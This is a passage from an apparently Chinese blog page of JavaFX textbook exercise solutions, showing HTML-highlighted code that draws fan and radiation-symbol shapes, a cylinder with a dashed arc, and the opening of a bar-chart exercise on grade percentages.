<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Arc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">ArcType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Circle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FourFan</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">GridPane</span> gridPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 将四个风扇放入GridPane中</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">createRadiationPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        gridPane<span class="token punctuation">.</span><span class="token function">setHgap</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">setVgap</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Fan Layout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/** 返回风扇面板，不过长得也不像啊 */</span>
    <span class="token keyword">private</span> <span class="token class-name">Pane</span> <span class="token function">createFanPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Pane</span> fanPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> radius <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> <span class="token comment">// 设定风扇的半径</span>

        <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span>radius<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 边界圆形</span>
        circle<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span>Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span>Color</span><span class="token punctuation">.</span><span class="token constant">WHITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fanPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Arc</span> arc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span>radius<span class="token punctuation">,</span> radius<span class="token punctuation">,</span> radius <span class="token operator">*</span> <span class="token number">0.9</span><span class="token punctuation">,</span> radius <span class="token operator">*</span> <span class="token number">0.9</span><span class="token punctuation">,</span> <span class="token number">22.5</span> <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span>Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置颜色</span>
            arc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">ROUND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置Arc的类型</span>
            fanPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>arc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> fanPane<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/* 这下看懂了 */</span>
    <span class="token keyword">private</span> <span class="token class-name">Pane</span> <span class="token function">createRadiationPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> centerX <span class="token operator">=</span> <span class="token number">150</span><span class="token punctuation">,</span> centerY <span class="token operator">=</span> <span class="token number">150</span><span class="token punctuation">,</span> radius <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>

        <span class="token comment">// 绘制中心圆</span>
        <span class="token class-name">Circle</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span>centerX<span class="token punctuation">,</span> centerY<span class="token punctuation">,</span> radius<span class="token punctuation">)</span><span class="token punctuation">;</span>
        circle<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">YELLOW</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>circle<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 绘制三个弧形</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Arc</span> arc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span>centerX<span class="token punctuation">,</span> centerY<span class="token punctuation">,</span> radius <span class="token operator">*</span> <span class="token number">0.7</span><span class="token punctuation">,</span> radius <span class="token operator">*</span> <span class="token number">0.7</span><span class="token punctuation">,</span>  i <span class="token operator">*</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span><span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLACK</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            arc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">ROUND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>arc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> pane<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPzrXKe.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzrXKe.png'">
<img src="/images/posts/pPzrg3T.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzrg3T.png'">
<h2 id="显示一个圓柱请写一个绘制圆柱的程序如图所示-可以使用如下方法来用虚线显示弧"><a class="markdownIt-Anchor" href="#显示一个圓柱请写一个绘制圆柱的程序如图所示-可以使用如下方法来用虚线显示弧"></a> （显示一个圓柱）请写一个绘制圆柱的程序，如图所示。可以使用如下方法来用虚线显示弧</h2>
<p><code>arc.getStrokeDashArray().addAll(6.0, 21.0);</code></p>
<img src="/images/posts/pPzdAKA.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzdAKA.png'">
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Group</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">BorderPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Arc</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">ArcType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Ellipse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Line</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CylinderWithArc</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span><span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Scene scene = new Scene(getPane3D(100,150), 300, 300);</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"显示圆柱"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/** 返回圆柱面板 */</span>
    <span class="token keyword">private</span> <span class="token class-name">Pane</span> <span class="token function">getPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Group</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 组</span>

        <span class="token keyword">double</span> <span class="token constant">X0</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> <span class="token constant">Y0</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">// 下圆心坐标</span>
        <span class="token keyword">double</span> height <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">// 高度</span>
        <span class="token keyword">double</span> radiusX <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> <span class="token comment">// X半径</span>
        <span class="token keyword">double</span> radiusY <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// Y半径</span>

        <span class="token comment">// 上边圆</span>
        <span class="token class-name">Ellipse</span> topEllipse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ellipse</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        topEllipse<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-stroke: black; -fx-fill: white; "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 黑色画线，白色填充</span>

        <span class="token comment">// 下边虚线弧</span>
        <span class="token class-name">Arc</span> dashArc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> height<span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        dashArc<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-fill: white; -fx-stroke: black;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 黑色画线，白色填充</span>
        dashArc<span class="token punctuation">.</span><span class="token function">getStrokeDashArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token number">6.0</span><span class="token punctuation">,</span> <span class="token number">21.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置虚线</span>
        dashArc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">OPEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置类型</span>

        <span class="token comment">// 下边实线弧</span>
        <span class="token class-name">Arc</span> solidArc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arc</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> height<span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        solidArc<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-fill: white; -fx-stroke: black;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        solidArc<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">ArcType</span><span class="token punctuation">.</span><span class="token constant">OPEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 左边线</span>
        <span class="token class-name">Line</span> left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token constant">X0</span> <span class="token operator">-</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> <span class="token constant">X0</span> <span class="token operator">-</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 右边线</span>
        <span class="token class-name">Line</span> right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token constant">X0</span> <span class="token operator">+</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> <span class="token constant">X0</span> <span class="token operator">+</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span> <span class="token operator">+</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>

        group<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>topEllipse<span class="token punctuation">,</span> dashArc<span class="token punctuation">,</span> solidArc<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/* 带简单三维透视转换的图形，但是效果好像不大对*/</span>
    <span class="token keyword">private</span> <span class="token class-name">Pane</span> <span class="token function">getPane3D</span><span class="token punctuation">(</span><span class="token keyword">double</span> observerDistance<span class="token punctuation">,</span> <span class="token keyword">double</span> observerAngle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Group</span> group <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建一个组</span>

        <span class="token keyword">double</span> <span class="token constant">X0</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> <span class="token constant">Y0</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">// 原始圆心坐标</span>
        <span class="token keyword">double</span> height <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">// 圆柱体的原始高度</span>
        <span class="token keyword">double</span> radiusX <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> <span class="token comment">// X轴的原始半径</span>
        <span class="token keyword">double</span> radiusY <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// Y轴的原始半径</span>

        <span class="token comment">// 根据观察者的距离和角度调整椭圆的大小</span>
        <span class="token keyword">double</span> perspectiveFactor <span class="token operator">=</span> observerDistance <span class="token operator">/</span> <span class="token punctuation">(</span>observerDistance <span class="token operator">+</span> height<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> adjustedRadiusX <span class="token operator">=</span> radiusX <span class="token operator">*</span> perspectiveFactor<span class="token punctuation">;</span>
        <span class="token keyword">double</span> adjustedRadiusY <span class="token operator">=</span> radiusY <span class="token operator">*</span> perspectiveFactor<span class="token punctuation">;</span>

        <span class="token comment">// 调整椭圆的位置</span>
        <span class="token keyword">double</span> adjustedY0 <span class="token operator">=</span> <span class="token constant">Y0</span> <span class="token operator">+</span> height <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">toRadians</span><span class="token punctuation">(</span>observerAngle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Ellipse</span> topEllipse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ellipse</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> radiusX<span class="token punctuation">,</span> radiusY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 上边的椭圆</span>
        topEllipse<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-stroke: black; -fx-fill: white;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Ellipse</span> bottomEllipse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ellipse</span><span class="token punctuation">(</span><span class="token constant">X0</span><span class="token punctuation">,</span> adjustedY0<span class="token punctuation">,</span> adjustedRadiusX<span class="token punctuation">,</span> adjustedRadiusY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 下边的椭圆</span>
        bottomEllipse<span class="token punctuation">.</span><span class="token function">setStyle</span><span class="token punctuation">(</span><span class="token string">"-fx-stroke: black; -fx-fill: white;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Line</span> left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token constant">X0</span> <span class="token operator">-</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> <span class="token constant">X0</span> <span class="token operator">-</span> adjustedRadiusX<span class="token punctuation">,</span> adjustedY0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 左边的线</span>
        <span class="token class-name">Line</span> right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token constant">X0</span> <span class="token operator">+</span> radiusX<span class="token punctuation">,</span> <span class="token constant">Y0</span><span class="token punctuation">,</span> <span class="token constant">X0</span> <span class="token operator">+</span> adjustedRadiusX<span class="token punctuation">,</span> adjustedY0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 右边的线</span>

        group<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>topEllipse<span class="token punctuation">,</span> bottomEllipse<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BorderPane</span><span class="token punctuation">(</span>group<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPzrRvF.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzrRvF.png'">
<h2 id="显示一个柱形图请写一个程序使用柱形图来显示一个总成绩的各个组成部分的百分比包括项目-测试-期中考试和期末考试如图所示-假设项目占20并显示为红色测试占10并显示为蓝色期中考试占30并显示为绿色期末考试占40-并显示为橙色-使用rectangle-类来显示柱形-有兴趣的读者可以探索使用javafx-的barchart-类来进一步学习"><a class="markdownIt-Anchor" href="#显示一个柱形图请写一个程序使用柱形图来显示一个总成绩的各个组成部分的百分比包括项目-测试-期中考试和期末考试如图所示-假设项目占20并显示为红色测试占10并显示为蓝色期中考试占30并显示为绿色期末考试占40-并显示为橙色-使用rectangle-类来显示柱形-有兴趣的读者可以探索使用javafx-的barchart-类来进一步学习"></a> （显示一个柱形图）请写一个程序，使用柱形图来显示一个总成绩的各个组成部分的百分比，包括项目、测试、期中考试和期末考试，如图所示。假设项目占20%并显示为红色，测试占10%并显示为蓝色，期中考试占30%并显示为绿色，期末考试占40% 并显示为橙色。使用Rectangle 类来显示柱形。有兴趣的读者可以探索使用JavaFX 的BarChart 类来进一步学习</h2>
<img src="/images/posts/pPzdFvd.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzdFvd.png'">
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">GridPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
